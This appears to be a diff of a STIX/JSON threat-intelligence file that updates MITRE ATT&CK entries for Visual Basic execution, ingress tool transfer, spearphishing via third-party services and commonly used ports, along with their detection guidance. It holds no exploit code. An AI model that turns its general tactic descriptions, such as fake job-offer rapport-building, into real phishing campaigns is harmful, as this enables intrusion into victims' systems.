-      "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Office applications.(Citation: Microsoft VBA)  VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.",
+      "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -1857,16 +1906,6 @@
         }
       ],
       "external_references": [
-        {
-          "source_name": "Microsoft VBA",
-          "url": "https://docs.microsoft.com/office/vba/api/overview/",
-          "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020."
-        },
-        {
-          "source_name": "Microsoft VBScript",
-          "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
-          "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020."
-        },
         {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1059/005",
@@ -1881,39 +1920,54 @@
           "source_name": "VB Microsoft",
           "url": "https://docs.microsoft.com/dotnet/visual-basic/",
           "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020."
+        },
+        {
+          "source_name": "Microsoft VBA",
+          "url": "https://docs.microsoft.com/office/vba/api/overview/",
+          "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020."
+        },
+        {
+          "source_name": "Wikipedia VBA",
+          "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
+          "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020."
+        },
+        {
+          "source_name": "Microsoft VBScript",
+          "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
+          "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent."
-      ],
+      "x_mitre_detection": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "DLL monitoring",
-        "File monitoring",
-        "Loaded DLLs",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Module: Module Load",
+        "Process: Process Creation",
+        "Script: Script Execution"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
         "User"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.1",
+      "x_panw_parent_technique": "Command and Scripting Interpreter",
+      "x_panw_parent_technique_subtechnique": "Command and Scripting Interpreter: Visual Basic"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.764Z",
+      "created": "2017-05-31T21:31:16.408Z",
+      "modified": "2020-03-20T15:42:48.595Z",
       "name": "T1105: Ingress Tool Transfer",
       "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
       "kill_chain_phases": [
@@ -1941,23 +1995,19 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
-      ],
+      "x_mitre_detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Netflow/Enclave netflow",
-        "Network protocol analysis",
-        "Packet capture",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Process use of network"
+        "File: File Creation",
+        "Network Traffic: Network Connection Creation",
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "User"
       ],
@@ -1967,10 +2017,10 @@
       "type": "attack-pattern",
       "id": "attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:44.085Z",
+      "created": "2020-03-02T19:24:00.951Z",
+      "modified": "2020-10-18T01:55:02.988Z",
       "name": "T1566.003: Spearphishing via Service",
-      "description": "Adversaries may send spearphishing messages via third-party services in an attempt to elicit sensitive information and/or gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
+      "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -1983,33 +2033,34 @@
       ],
       "external_references": [
         {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/163.html",
-          "external_id": "CAPEC-163"
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1566/003",
           "external_id": "T1566.003"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/163.html",
+          "external_id": "CAPEC-163"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts."
-      ],
+      "x_mitre_detection": "Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Anti-virus",
-        "SSL/TLS inspection",
-        "Web proxy"
+        "Application Log: Application Log Content",
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_version": "2.0",
+      "x_panw_parent_technique": "Phishing",
+      "x_panw_parent_technique_subtechnique": "Phishing: Spearphishing via Service"
     },
     {
       "type": "attack-pattern",
@@ -2073,10 +2124,10 @@
       "type": "attack-pattern",
       "id": "attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-03-18T19:43:59.299Z",
+      "created": "2017-05-31T21:30:42.657Z",
+      "modified": "2020-07-06T17:54:28.071Z",
       "name": "T1043: Commonly Used Port",
-      "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
+      "description": "**This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -2102,23 +2153,14 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
-      ],
+      "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
-      "x_mitre_data_sources": [
-        "Netflow/Enclave netflow",
-        "Packet capture",
-        "Process monitoring",
-        "Process use of network"
-      ],
-      "x_mitre_network_requirements": [
-        "true"
-      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_network_requirements": true,
       "x_mitre_version": "1.0"
     },
     {
